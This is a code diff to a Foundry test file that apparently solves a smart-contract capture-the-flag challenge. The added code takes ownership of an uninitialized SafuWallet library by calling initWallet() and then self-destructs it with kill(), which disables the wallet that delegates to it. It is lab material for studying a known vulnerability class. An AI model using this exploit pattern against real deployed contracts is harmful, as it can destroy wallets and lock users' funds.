@@ -58,9 +58,29 @@ contract Testing is Test {
 
         // NOTE: This challenge requires you to implement the exploit here in setUp()
         vm.startPrank(attacker,attacker);
-
+        
         // implement solution here
 
+        //We are in a situation where safuWalletLibrary is deployed but not initialized and so all the variable are at 0
+        // After the deployment of safuWallet, we might thinking that the variable inside safuWalletLibrary are updated
+        //However during a delegatecall the caller storage is updated not the callee
+        //(In this challenge we have a storage collision but not useful)
+        //And so the variables inside safuWalletLibrary are still at 0
+        //We are able to kill safuWalletLibrary -> safuWallet is unable to do a delegatecall for this address
+
+        //Call initWallet() in order to get the ownership
+        addresses = new address[](1);
+        addresses[0] = attacker;
+        data = abi.encodeWithSignature(
+        "initWallet(address[],uint256,uint256)",
+        addresses,1,type(uint).max);
+        address(safuWalletLibrary).call(data);
+
+        //call kill() in order to destruct the contract
+        data = abi.encodeWithSignature("kill(address)",address(attacker));
+        address(safuWalletLibrary).call(data);
+
+    
         vm.stopPrank();
 
     }
